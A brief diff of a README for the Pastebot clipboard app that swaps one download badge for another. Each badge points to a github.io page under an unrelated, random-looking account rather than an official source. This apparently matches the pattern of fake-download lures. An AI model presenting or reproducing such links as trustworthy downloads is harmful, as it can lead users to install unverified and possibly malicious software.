@@ -4,11 +4,7 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/12/24/e0/1224e092-97c5-fb6e-fede-c6b1a2abbd54/AppIcon-0-0-85-220-0-0-0-0-4-0-0-0-2x-sRGB-0-0-0-0-0.png/1200x600bf.png" alt="Pastebot Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/pastebot">  
-<img src="https://img.shields.io/badge/GET_Pastebot-darkgreen?style=for-the-badge&logo=apple" alt="GET Pastebot">  
-</a>  
-</div>  
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://zilkaflerayat.github.io/.github/pastebot-clipboard-manager)
 
 ---
 
